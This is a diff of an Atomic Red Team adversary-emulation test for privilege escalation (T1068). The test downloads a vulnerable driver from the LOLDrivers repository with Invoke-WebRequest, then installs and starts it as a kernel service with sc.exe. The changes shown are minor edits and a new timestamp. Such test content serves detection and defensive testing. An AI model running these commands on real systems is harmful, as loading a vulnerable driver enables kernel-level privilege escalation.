@@ -19,8 +19,8 @@
           {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys";
           New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null;
           $DriverURL = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/eaea9ccb40c82af8f3867cd0f4dd5e9d.bin";
-          Invoke-WebRequest -Uri $DriverURL -OutFile "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys";
-          fi; sc.exe create vboxdrv.sys binPath="PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys"
+          Invoke-WebRequest -Uri $DriverURL -OutFile "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys"
+          -UseBasicParsing; fi; sc.exe create vboxdrv.sys binPath="PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys"
           type=kernel; sc.exe start vboxdrv.sys'
         cleanup: sc.exe stop vboxdrv.sys; sc.exe delete vboxdrv.sys; Remove-Item -Recurse
           "#{driver_path}" -ErrorAction Ignore
@@ -31,8 +31,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - privilege-escalation
+  - atomic-red-team
   - t1068
   author: Atomic Red Team
   additional_info:
@@ -53,9 +53,9 @@
 
         $DriverURL = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/eaea9ccb40c82af8f3867cd0f4dd5e9d.bin"
 
-        Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}"
+        Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}" -UseBasicParsing
 
         '
     technique_created: '2017-05-31T21:30:55.066Z'
     atomic_guid: 97f621a5-851c-484f-b784-4a9c475006ec
-    import_timestamp: '2026-10-20T07:08:27.510367Z'
+    import_timestamp: '2026-10-21T07:01:50.148558Z'
